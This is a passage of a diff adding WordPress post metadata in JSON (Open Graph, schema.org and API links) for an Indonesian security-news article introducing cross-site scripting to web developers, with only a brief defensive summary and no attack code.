+      "og_description": "Pendahuluan Cross Site Scripting atau yang biasa disingkat XSS adalah salah satu jenis serangan siber yang cukup sering menyerang aplikasi web. Banyak pengembang web yang masih belum memahami secara mendalam bagaimana XSS bekerja dan bagaimana mencegahnya. Padahal, jika tidak ditangani dengan baik, XSS bisa membahayakan pengguna dan merusak reputasi aplikasi. Artikel ini ditulis untuk membantu web developer memahami XSS dan cara mencegahnya dengan bahasa yang mudah dimengerti. Apa Itu XSS? XSS adalah jenis serangan di mana penyerang menyisipkan skrip berbahaya ke dalam halaman web yang akan dilihat oleh pengguna lain. Biasanya skrip tersebut berupa kode JavaScript yang akan dieksekusi di...",
+      "og_url": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/",
+      "og_site_name": "buletinsiber.com",
+      "article_publisher": "https://www.facebook.com/publiksultra/",
+      "article_published_time": "2025-07-09T02:50:03+00:00",
+      "og_image": [
+        {
+          "width": 1200,
+          "height": 675,
+          "url": "https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp",
+          "type": "image/webp"
+        }
+      ],
+      "author": "public enemy",
+      "twitter_card": "summary_large_image",
+      "twitter_misc": {
+        "Written by": "public enemy",
+        "Est. reading time": "4 minutes"
+      },
+      "schema": {
+        "@context": "https://schema.org",
+        "@graph": [
+          {
+            "@type": "WebPage",
+            "@id": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/",
+            "url": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/",
+            "name": "XSS dalam Perspektif Keamanan Web Developer - buletinsiber.com",
+            "isPartOf": {
+              "@id": "https://buletinsiber.com/#website"
+            },
+            "primaryImageOfPage": {
+              "@id": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#primaryimage"
+            },
+            "image": {
+              "@id": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#primaryimage"
+            },
+            "thumbnailUrl": "https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp",
+            "datePublished": "2025-07-09T02:50:03+00:00",
+            "dateModified": "2025-07-09T02:50:03+00:00",
+            "author": {
+              "@id": "https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91"
+            },
+            "breadcrumb": {
+              "@id": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#breadcrumb"
+            },
+            "inLanguage": "en-US",
+            "potentialAction": [
+              {
+                "@type": "ReadAction",
+                "target": [
+                  "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/"
+                ]
+              }
+            ]
+          },
+          {
+            "@type": "ImageObject",
+            "inLanguage": "en-US",
+            "@id": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#primaryimage",
+            "url": "https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp",
+            "contentUrl": "https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp",
+            "width": 1200,
+            "height": 675
+          },
+          {
+            "@type": "BreadcrumbList",
+            "@id": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#breadcrumb",
+            "itemListElement": [
+              {
+                "@type": "ListItem",
+                "position": 1,
+                "name": "Home",
+                "item": "https://buletinsiber.com/"
+              },
+              {
+                "@type": "ListItem",
+                "position": 2,
+                "name": "XSS dalam Perspektif Keamanan Web Developer"
+              }
+            ]
+          },
+          {
+            "@type": "WebSite",
+            "@id": "https://buletinsiber.com/#website",
+            "url": "https://buletinsiber.com/",
+            "name": "buletinsiber.com",
+            "description": "sumber berita terupdate seputar keamanan siber dan teknologi terkini",
+            "alternateName": "buletin siber",
+            "potentialAction": [
+              {
+                "@type": "SearchAction",
+                "target": {
+                  "@type": "EntryPoint",
+                  "urlTemplate": "https://buletinsiber.com/?s={search_term_string}"
+                },
+                "query-input": {
+                  "@type": "PropertyValueSpecification",
+                  "valueRequired": true,
+                  "valueName": "search_term_string"
+                }
+              }
+            ],
+            "inLanguage": "en-US"
+          },
+          {
+            "@type": "Person",
+            "@id": "https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91",
+            "name": "public enemy",
+            "image": {
+              "@type": "ImageObject",
+              "inLanguage": "en-US",
+              "@id": "https://buletinsiber.com/#/schema/person/image/",
+              "url": "https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g",
+              "contentUrl": "https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g",
+              "caption": "public enemy"
+            },
+            "url": "https://buletinsiber.com/author/public_enemy/"
+          }
+        ]
+      }
+    },
+    "jetpack_publicize_connections": [],
+    "_links": {
+      "self": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts/4070",
+          "targetHints": {
+            "allow": [
+              "GET"
+            ]
+          }
+        }
+      ],
+      "collection": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts"
+        }
+      ],
+      "about": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/types/post"
+        }
+      ],
+      "author": [
+        {
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/users/2"
+        }
+      ],
+      "replies": [
+        {
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/comments?post=4070"
+        }
+      ],
+      "version-history": [
+        {
+          "count": 1,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts/4070/revisions"
+        }
+      ],
+      "predecessor-version": [
+        {
+          "id": 4072,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/posts/4070/revisions/4072"
+        }
+      ],
+      "wp:featuredmedia": [
+        {
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/media/4071"
+        }
+      ],
+      "wp:attachment": [
+        {
+          "href": "https://buletinsiber.com/wp-json/wp/v2/media?parent=4070"
+        }
+      ],
+      "wp:term": [
+        {
+          "taxonomy": "category",
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/categories?post=4070"
+        },
+        {
+          "taxonomy": "post_tag",
+          "embeddable": true,
+          "href": "https://buletinsiber.com/wp-json/wp/v2/tags?post=4070"
+        }
+      ],
+      "curies": [
+        {
+          "name": "wp",
+          "href": "https://api.w.org/{rel}",
+          "templated": true
+        }
+      ]
+    }
+  }
+}
